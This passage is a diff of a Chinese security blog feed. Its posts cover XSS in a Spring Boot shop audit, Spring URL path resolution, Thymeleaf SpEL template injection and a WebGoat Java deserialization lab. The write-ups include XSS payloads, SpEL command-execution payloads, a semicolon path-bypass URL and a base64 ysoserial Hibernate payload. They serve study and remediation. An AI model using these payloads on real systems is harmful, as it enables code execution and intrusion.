+<p>我们先来实际测试一下XSS，在首页搜索框中输入XSS payload <code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try.png" alt="xss-first-try"></p>
+<p>查看返回结果，咦奇怪，怎么XSS payload没有触发呢？</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try-response.png" alt="xss-first-try-response"></p>
+<p>抓包看一下，确定是XSS payload中的<code>&quot;&lt;&gt;</code>被转义了</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-first-try.png" alt="burp-xss-first-try"></p>
+<p>我们下断点调试看一下，传进来的keyword确实是<code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>，传入Web系统的过程中没有转义处理，那问题出在哪里呢？</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/debug-xss-first-try.png" alt="debug-xss-first-try"></p>
+<p>其实转义出现在输出到模版的过程中，系统使用了thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
+<p><code>/src/main/resources/templates/mall/search.html:33</code></p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/thymeleaf-transfer.png" alt="thymeleaf-transfer"></p>
+<p>此时XSS payload传递路径如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-request-path.png" alt="xss-request-path" style="zoom:50%;">
+
+<p>弄明白XSS payload被转义的原理之后，我们可以转换思路：</p>
+<ol>
+<li>找thymeleaf未作转义的输出，<code>th:utext</code>不会将字符转义</li>
+</ol>
+<p>发现以下模版中存在<code>th:utext</code>，所以这两个功能点存在XSS。其中第二个，<code>detail.html</code>因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用<code>th:utext</code>来显示商品详细。</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/search-not-transferred.png" alt="search-not-transferred"></p>
+<ol start="2">
+<li>找不经过thymeleaf的输出</li>
+</ol>
+<p>在后台，商品信息编辑中输入XSS payload，点击保存</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/not-through-thymeleaf.png" alt="not-through-thymeleaf"></p>
+<p>发现触发我们输入的XSS payload</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-exploit.png" alt="xss-exploit"></p>
+<p>我们可以抓包看一下，商品信息使用jqGrid传输，将返回的json显示到网页中，该过程没有对字符串进行转义，导致XSS漏洞产生。</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-second-try.png" alt="burp-xss-second-try"></p>
+<p>除以上举例之外，系统还存在多处XSS，在此就不一一列举，大家有兴趣的话可以自己试着找找。 </p>
+<h1 id="XSS-修复"><a href="#XSS-修复" class="headerlink" title="XSS 修复"></a>XSS 修复</h1><p>预防存储型和反射型XSS的代码有两种常见方法：</p>
+<ol>
+<li>对HTML做充分转义</li>
+</ol>
+<p>转义一般在filter或interceptor中做，如何添加xss filter网上有很多资料可以参考，比如 <a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a> ，就不在此赘述。</p>
+<p>XSS难以消灭其中一个因素是功能需求与转义相背，比如filter转义把json中的双引号转义导致json无法解析；富文本编辑器就不能转义正常用户所需的html标签，需要额外对允许输入的标签做一个白名单过滤；大于小于号的比较，输入<code>1&lt;2</code>，转义就变成了<code>1 &amp;lt; 2</code>导致功能失效等。</p>
+<p>修复过程中得结合考虑实际的业务场景。</p>
+<ol start="2">
+<li>改成纯前端渲染，避免直接输出html字符，把代码和数据完全分隔开，但是又需要注意DOM XSS的问题。</li>
+</ol>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>除了存储型和反射型XSS，还有DOM型XSS，因为它属于前端JavaScript的范畴，和后端Java代码没有关系，所以我没在本文中提及。</p>
+<p>HttpOnly属性：SpringBoot默认为会话cookie开启httponly，审计时检查是否存在<code>server.servlet.session.cookie.http-only</code>属性，如果存在的话检查其是否被改为false</p>
+<p>CSP：在响应头中添加<code>X-Content-Security-Policy</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSecurityConfig</span> <span class="keyword">extends</span></span></span><br><span class="line"><span class="class">	<span class="title">WebSecurityConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		http</span><br><span class="line">			<span class="comment">// ...</span></span><br><span class="line">			.headers()</span><br><span class="line">				.addHeaderWriter(<span class="keyword">new</span> StaticHeadersWriter(<span class="string">"X-Content-Security-Policy"</span>,<span class="string">"script-src 'self'"</span>))</span><br><span class="line">			<span class="comment">// ...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">https://tech.meituan.com/2018/09/27/fe-security.html</a></p>
+<p><a href="https://blog.csdn.net/heweimingming/article/details/79993591" target="_blank" rel="noopener">https://blog.csdn.net/heweimingming/article/details/79993591</a></p>
+<p><a href="https://juejin.im/entry/59bcdb34f265da06461884a4" target="_blank" rel="noopener">https://juejin.im/entry/59bcdb34f265da06461884a4</a></p>
+<p><a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -1409,6 +1409,97 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Spring中请求URL找到相应Controller的过程</title>
+    <url>/2020/08/22/Spring_URL2Controller/</url>
+    <content><![CDATA[<p>我把Spring请求URL找到相应Controller的过程调试了一遍，在此记录该过程，属于个人记录，其中很可能存在某些不细致甚至错误的地方，还请见谅。</p>
+<p>代码版本为<code>spring-webmvc-5.2.5.RELEASE-sources.jar</code></p>
+<a id="more"></a>
+
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>分析入口：<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/doDispatch.png" alt="doDispatch"></p>
+<p>跟进<code>getHandler</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getHandler.png" alt="getHandler"></p>
+<p>再跟进<code>mapping.getHandler</code>，它是一个<code>interface</code>，此处由<code>AbstractHandlerMapping</code>实现该方法</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/mapping.handler.png" alt="mapping.handler"></p>
+<p>点击148行右侧的绿色图标，跳转到<code>AbstractHandlerMapping#getHandler</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/AbstractHandlerMapping.getHandler.png" alt="AbstractHandlerMapping.getHandler"></p>
+<p>此处<code>getHandlerIngernal</code>是一个抽象方法，在<code>AbstractHandlerMethodMapping#getHandlerInternal</code>中实现了该抽象方法</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getHandlerInternal.png" alt="getHandlerInternal"></p>
+<h2 id="getLookupPathForRequest"><a href="#getLookupPathForRequest" class="headerlink" title="getLookupPathForRequest"></a>getLookupPathForRequest</h2><p>重点在此，<code>getUrlPathHelper().getLookupPathForRequest(request)</code>中从请求中获取代码中对应的path，可以在此下断点进行调试，详细了解Spring是怎么获取请求路径的。</p>
+<p>传入<code>http://localhost/shiro/admin;////..;/manage/page/index</code>进行调试（如果此时传入正常的URL，则<code>getPathWithinServletMapping</code>方法会返回空字符串，再到<code>else</code>中的<code>getPathWithinAPPlication</code>方法）</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getLookupPathForRequest.png" alt="getLookupPathForRequest"></p>
+<p>跟进<code>getPathWithinServletMapping</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping.png" alt="getPathWithinServletMapping"></p>
+<h3 id="getPathWithinApplication"><a href="#getPathWithinApplication" class="headerlink" title="getPathWithinApplication"></a>getPathWithinApplication</h3><p>首先来看<code>getPathWithinApplication</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinApplication.png" alt="getPathWithinApplication"></p>
+<p>其中<code>getContextPath</code>为获取Context path，不做重点分析，重点来看<code>getRequestUri</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getRequestUri.png" alt="getRequestUri"></p>
+<p><code>request.getRequestURI()</code>得到的是<code>/shiro/admin;////..;/manage/page/index</code>，继续跟进<code>decodeAndCleanUriString</code>方法</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/decodeAndCleanUriString.png" alt="decodeAndCleanUriString"></p>
+<p><code>decodeAndCleanUriString</code>方法对<code>uri</code>进行了三种处理</p>
+<p>(1) 移除两个<code>/</code>间，分号和分号后的内容，得到<code>/shiro/admin////../manage/page/index</code></p>
+<p>（例如传入<code>/admin;random/page;jsessionid=1111</code>，会得到<code>/admin/page/</code>）</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/removeSemicolonContent.png" alt="removeSemicolonContent"></p>
+<p>(2) URL解码（URL解码没什么好说的）</p>
+<p>(3) 移除多余的<code>/</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getSanitizedPath.png" alt="getSanitizedPath"></p>
+<p>经过以上处理，最终得到的uri是<code>/shiro/admin/../manage/page/index</code></p>
+<p>回到<code>getPathWithinApplication</code>方法，其中<code>getRemainingPath</code>方法将移除<code>requestUri</code>中和<code>contextPath</code>中相同的字段（在此是<code>/shiro</code>），得到<code>/admin/../manage/page/index</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinApplication2.png" alt="getPathWithinApplication2"></p>
+<h3 id="getServletPath"><a href="#getServletPath" class="headerlink" title="getServletPath"></a>getServletPath</h3><p>也就是通过<code>request.getServletPath()</code>获取Servlet路径，得到<code>/manage/page/index</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getServletPath.png" alt="getServletPath"></p>
+<h3 id="getPathWithinApplication-2"><a href="#getPathWithinApplication-2" class="headerlink" title="getPathWithinApplication 2"></a>getPathWithinApplication 2</h3><p>经过以上代码，回到<code>getPathWithinApplication</code>。其中第218行<code>sanitizedPathWithinApp</code>变量，再次移除多余的<code>/</code>，uri在此无变化。</p>
+<p>之后存在一个if判断，当<code>sanitizedPathWithinApp</code>不是<code>servletPath</code>的子集时，<code>path</code>等于<code>getRemainingPath(pathWithinApp, servletPath, false)</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping2.png" alt="getPathWithinServletMapping2"></p>
+<p>此时<code>getRequestURI</code>得到的<code>/admin/../manage/page/index</code>和<code>getServletPath</code>获取到的<code>/manage/page/index</code>开头无法匹配，经过<code>getRemainingPath</code>得到的path为<code>null</code>。</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping3.png" alt="getPathWithinServletMapping3"></p>
+<p>经过以上代码处理，最终返回的是<code>servletPath</code>，也就是返回<code>/manage/page/index</code>。</p>
+<p>这里多说一下，通过<code>getReqeustURI</code>和<code>getServletPath</code>进行对比，当两者不同时，尝试<code>getPathInfo</code>。若<code>PathInfo</code>为空，最后返回<code>SerletPath</code>。通过这几个if判断，确保能正确获取请求路径（因为<code>getReqeustURI</code>得到的结果不可信，利用各种URL兼容性难以通过URI判断实际请求路径）。</p>
+<h2 id="lookupHandlerMethod"><a href="#lookupHandlerMethod" class="headerlink" title="lookupHandlerMethod"></a>lookupHandlerMethod</h2><p>得到请求的资源路径之后，回到<code>AbstractHandlerMethodMapping#getHandlerInternal</code>，调用<code>lookupHandlerMethod</code>方法</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getHandlerInternal2.png" alt="getHandlerInternal2"></p>
+<p>看该方法的描述，进行最合适的匹配。</p>
+<blockquote>
+<p>Look up the best-matching handler method for the current request.<br>If multiple matches are found, the best match is selected.</p>
+</blockquote>
+<p><img src="/2020/08/22/Spring_URL2Controller/lookupHandlerMethod.png" alt="lookupHandlerMethod"></p>
+<p>它定义了一个<code>matchs</code>的列表，然后内存变量<code>mappingRegistry</code>根据<code>lookupPath</code>获取所有的匹配对象。</p>
+<p>如果存在这个匹配对象，那么回调用<code>addMatchingMappings</code>方法将匹配的对象映射到<code>matches</code>上。</p>
+<p>如果未匹配到这个<code>lookupPath</code>，那么则会循环<code>mappingRegistry</code>中每个Mapping来匹配该路劲（因为RequestMapping中定义的路劲可以有通配符）。</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/mappingRegistry.png" alt="mappingRegistry"></p>
+<p>至于<code>if(!matches.isEmpty())</code>内的代码，只是看看有没有一个请求映射到多个处理方法，如果存在并且优先级还一样，那么就会报错：Ambiguous handler methods mapped for HTTP path。</p>
+<p>来看<code>addMatchingMappings</code>的代码</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/addMatchingMappings.png" alt="addMatchingMappings"></p>
+<p>注意到<code>AbstractHandlerMethodMapping</code>这个class是个泛型抽象类 <code>getMatchingMapping</code>是个抽象方法，返回值为定义的泛型(T)，我们暂且把这个泛型成为[映射信息]。</p>
+<p>根据方法名称，<code>T getMatchingMapping(T,reqeust)</code>，根据映射信息和请求获取是否匹配，如果匹配则返回映射信息。</p>
+<p><code>RequestMappingInfoHandlerMapping</code>这个class继承了这个抽象类,泛型类型为：<code>RequestMappingInfo</code>。看看它的方法实现</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/getMatchingCondition.png" alt="getMatchingCondition"></p>
+<p>如果其中<code>methods</code>、<code>params</code>、<code>headers</code>、<code>consumes</code>、<code>produces</code>、<code>patterns</code>、<code>custom</code>都匹配，那么可以说这个[映射信息]就匹配成功了。如果未匹配成功，则返回404。</p>
+<ol>
+<li><p>methods : 请求方法匹配（POST/GET/DELETE/PUT等等)，对应RequestMapping注解的method</p>
+</li>
+<li><p>params : 请求参数匹配 例如myParam=myValue，对应RequestMapping注解的params</p>
+</li>
+<li><p>headers : 请求头信息(例如：User-Agent: Mozilla/5.0），对应RequestMapping的headers</p>
+</li>
+<li><p>consumes : 提交内容类型(例如:application/json, text/html;)，对应RequestMapping的consumes</p>
+</li>
+<li><p>produces : 返回的内容类型(例如:application/json)，对应RequestMapping的consumes</p>
+</li>
+<li><p>patterns : URL格式(例如:test/testDo)，对应RequestMapping的value</p>
+</li>
+<li><p>自定义条件</p>
+</li>
+</ol>
+<p>根据以上匹配得到的信息，就能找到对应的Controller。</p>
+<p><code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</code></p>
+<p><img src="/2020/08/22/Spring_URL2Controller/HandlerExecutionChain.png" alt="HandlerExecutionChain"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Spring中获取请求路径的过程，在<code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping</code>中，其流程大概如下图所示。</p>
+<p><img src="/2020/08/22/Spring_URL2Controller/diagram.png" alt="diagram"></p>
+<p>其中比较关键的点是<code>getPathWithinApplication</code>方法，其中对RequestURI的处理有：删除冒号及冒号后的内容，URL解码，去除重复斜杠<code>/</code>（注意是先删除冒号，再URL解码）。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/hl233211/article/details/77450697" target="_blank" rel="noopener">https://blog.csdn.net/hl233211/article/details/77450697</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Spring Thymeleaf模版注入</title>
     <url>/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/</url>
     <content><![CDATA[<h2 id="Thymeleaf介绍"><a href="#Thymeleaf介绍" class="headerlink" title="Thymeleaf介绍"></a>Thymeleaf介绍</h2><p> Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP 。相较与其他的模板引擎，它有如下三个极吸引人的特点：</p>
@@ -1429,7 +1520,7 @@
 <br>
 
 <p>漏洞复现：</p>
-<p>![path-request](Spring_Thymeleaf_View_ Manipulation/path-request.png)</p>
+<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/path-request.png" alt="path-request"></p>
 <br>
 
 <p>先来看payload: <code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x</code></p>
@@ -1449,7 +1540,7 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String preprocessedInput =</span><br><span class="line">    (preprocess? StandardExpressionPreprocessor.preprocess(context, input) : input);</span><br></pre></td></tr></table></figure>
 
 <p>继续跟进<code>StandardExpressionPreprocessor.preprocess</code>，在<a href="https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionPreprocessor.java#L80" target="_blank" rel="noopener">StandardExpressionPreprocessor</a>中，使用正则表达式将路径中的表达式提取出来。其中正则规则：<code>\_\_(.*?)\_\_</code>（表示非贪婪匹配两个<code>__</code>之间的内容），匹配得到<code>${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}</code></p>
-<p>![debug-preprocess](Spring_Thymeleaf_View_ Manipulation/debug-preprocess.png)</p>
+<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/debug-preprocess.png" alt="debug-preprocess"></p>
 <p>提取表达式之后就是根据框架进行对应的表达式解析，这里是Spring所以用的就是SpringEL表达式解析。</p>
 <br>
 
@@ -1463,9 +1554,9 @@
 <p>作者给出的payload: <code>__${T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;)}__::.x</code></p>
 <p>和之前的payload相比，少了<code>java.util.Scanner</code>，直接进行命令执行，无回显。</p>
 <p>我在这里试了一下回显的payload，发现报错中没有<code>id</code>的执行结果</p>
-<p>![doc-request](Spring_Thymeleaf_View_ Manipulation/doc-request.png)</p>
+<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/doc-request.png" alt="doc-request"></p>
 <p>动态调试分析，原因是Spring分配URI时会自动抹去后缀名，导致缺少了<code>.x</code>，无法正常回显。再加一个<code>.x</code>就能正常回显。若一个<code>.x</code>都不加，payload会被截成<code>__${T(java.lang.Runtime).getRuntime()</code>，导致命令执行失败。</p>
-<p>![doc-request2](Spring_Thymeleaf_View_ Manipulation/doc-request2.png)</p>
+<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/doc-request2.png" alt="doc-request2"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞原理很简单，就是Thymeleaf的视图参数可进行表达式解析，若用户输入可控制视图参数，就会导致SpEL注入漏洞产生。</p>
 <p>漏洞细节点是payload的构造，需要添加<code>__</code>和<code>::</code>引导表达式解析。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/veracode-research/spring-view-manipulation" target="_blank" rel="noopener">https://github.com/veracode-research/spring-view-manipulation</a></p>
@@ -1602,94 +1693,156 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Spring中请求URL找到相应Controller的过程</title>
-    <url>/2020/08/22/Spring_URL2Controller/</url>
-    <content><![CDATA[<p>我把Spring请求URL找到相应Controller的过程调试了一遍，在此记录该过程，属于个人记录，其中很可能存在某些不细致甚至错误的地方，还请见谅。</p>
-<p>代码版本为<code>spring-webmvc-5.2.5.RELEASE-sources.jar</code></p>
+    <title>WebGoat - 不安全的反序列化</title>
+    <url>/2019/09/28/WebGoat-Deserialization/</url>
+    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
+<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
+<p>最早的一篇讲解Webgoat反序列化的文章</p>
+<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
+<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
+<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
+<p>另一篇文章</p>
+<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
+<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
+<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
+<p>然后将请求Send request to DS - Exploitation</p>
+<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
+<p>详细报错信息如下所示</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
+<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
+<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
+<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
+<blockquote>
+<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
+</blockquote>
+<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
+<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
+<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
+<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
+<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
+<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
+<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
+<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
+<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>
+
+<p>最终效果图如下：</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
+<p>payload也贴一下吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJ